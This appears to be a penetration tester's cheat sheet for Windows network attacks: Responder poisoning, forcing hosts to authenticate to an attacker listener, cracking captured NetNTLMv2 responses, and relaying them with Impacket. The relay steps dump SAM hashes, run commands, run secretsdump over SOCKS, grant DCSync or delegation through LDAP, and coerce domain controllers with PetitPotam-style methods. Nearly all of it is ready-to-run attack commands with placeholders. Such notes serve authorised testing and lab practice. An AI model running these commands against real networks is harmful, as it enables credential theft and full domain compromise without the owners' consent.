# Responder and NTLM relay

## Listen
Just watch the broadcasts first, poisoning nothing:
sudo responder -I tun0 -A
sudo responder -I tun0
- [ ] eth0 in place of tun0 on an internal network
- [ ] Captures land in /usr/share/responder/logs/, one file per protocol and client
- [ ] Each user shows once: delete /usr/share/responder/Responder.db to see repeats

## Make a host connect to me
- [ ] MSSQL login: EXEC master..xp_dirtree '\\<LHOST>\share';
- [ ] File inclusion on a Windows web server: ?<Param>=\\<LHOST>\share\x
- [ ] SSRF, XXE or an upload that takes a path: \\<LHOST>\share or file://<LHOST>/share
- [ ] A shell as another user: dir \\<LHOST>\share
A lure on every share I can write, for whoever browses it. At the pwn-broker prompt: tool install netexec and tool install impacket.
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important CLEANUP=True
- [ ] The second line removes the lure afterwards
- [ ] The full path for Impacket with sudo: sudo does not search pwn-broker's bin folder
Just an SMB listener, with no poisoning:
sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support

## Crack it
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<TargetIP>.txt /usr/share/wordlists/rockyou.txt
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-<TargetIP>.txt
- [ ] A NetNTLMv2 response is not a hash I can pass: crack it or relay it
- [ ] A computer account, ending in $, never cracks: relay it

## Relay targets
Hosts that do not require SMB signing:
nxc smb <Subnet>/<CIDR> --gen-relay-list relay.txt
- [ ] The DCs sign by default, so they are not in it
- [ ] The account I catch must be a local administrator on the target for an SMB relay to dump anything

## Relay to SMB
Responder's own SMB and HTTP servers off, so ntlmrelayx can take those ports:
sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support
sudo responder -I tun0
- [ ] With no other option it dumps the SAM of each target it gets into
A command instead of the SAM:
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support -c 'whoami'
Every session kept open for my own tools, through proxychains:
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -tf relay.txt -smb2support -socks
proxychains -q impacket-secretsdump -no-pass '<Domain>/<TargetUser>@<TargetIP>'
- [ ] The last line of /etc/proxychains4.conf is socks4 127.0.0.1 1080
- [ ] socks, at the ntlmrelayx prompt, lists the sessions and whether each is an admin
- [ ] Responder.conf set back to On afterwards

## Relay to LDAP
Signing on the DC's LDAP blocks a relay from SMB, but not one from HTTP, such as WebDAV.
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t ldaps://<DCIP> --delegate-access -smb2support
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t ldap://<DCIP> --escalate-user '<Username>' -smb2support
- [ ] A computer account caught with --delegate-access: a new machine with resource-based constrained delegation over it: :Pb delegation
- [ ] --escalate-user gives my user DCSync when the caught account may change the domain's ACL
- [ ] Relaying to the CA's web enrollment instead, ADCS ESC8: :Pb adcs

## Make a DC authenticate to me
nxc smb <DCIP> -u '<Username>' -p '<Password>' -M coerce_plus
nxc smb <DCIP> -u '<Username>' -p '<Password>' -M coerce_plus -o LISTENER=<LHOST>
- [ ] The first line only checks which methods work: PetitPotam, PrinterBug, DFSCoerce and others
- [ ] A DC's response relayed back to the same DC never works
